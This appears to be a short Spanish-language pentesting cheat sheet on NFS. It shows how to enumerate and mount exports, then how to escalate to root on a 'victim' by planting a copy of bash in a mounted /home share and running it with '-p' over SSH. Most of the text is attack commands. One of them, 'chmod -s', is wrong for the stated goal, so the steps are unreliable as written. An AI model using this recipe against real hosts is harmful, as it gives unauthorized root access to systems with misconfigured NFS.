# NFS

Tags: #NFS #Linux 

Protocolo que permite compartir directorios/archivos en la red entre máquinas Unix/Linux. Un servidor NFS exporta directorios que otros clientes pueden montar localmente como si fueran directorios locales.

## Instalar la herramienta 
```bash 
❯ apt install nfs-common        # Instalar la tool 
# Proporciona las herramientas necesarias para actuar como cliente NFS en Linux
```

## Extracción de archivos  
```bash 
# Cuando encontremos estos puertos lo mas probables que es que exista una montura 

❯ showmount --exports <IP>      # Ver si podemos hacer una montura de alguna ruta
❯ mkdir disk_mnt                # Crear dir de la montura en Kali 

# Hacer la montura de la ruta anterior a una de nuestro kali 
❯ mount -t nfs -o nolock <IP>:/srv/nfs/user1 disk_mnt

	# nfs = Tipo de filesystem 
	# nolock = Opcional: No usar lock de archivos (más rápido, menos seguro)
	# disk_mnt = Directorio donde se va a copiar la montura 
	# <IP>:/srv/nfs/user1 = IP más ruta remota del primer comando 'showmount'

❯ umount disk_mnt   # Al finaalizar desmontaar el directorio 
```

## Escalada con NFS
```bash 
❯ showmount -e <IP>             # Mirar el directorio de montura 
❯ mkdir /tmp/disk_mnt           # Crear dir de la montura en Kali 
❯ mount -t nfs <IP>:/home /tmp/disk_mnt     # Montar el directorio de la víctima en el dir '/tmp' de Kali 

# Ingresar a la montura y copiar la 'bash' para hacerla root
❯ sudo cp /bin/bash .
❯ sudo chmod -s bash 
❯ sudo df -h             # Mirar la cantidad de disco disponible

# Ingresar a la máquina víctima y ejecutar la bash con privilegios de root 
❯ ssh ubuntu@IP 
❯ ./bash -p         

❯ umount disk_mnt    # Al finaalizar desmontaar el directorio   
```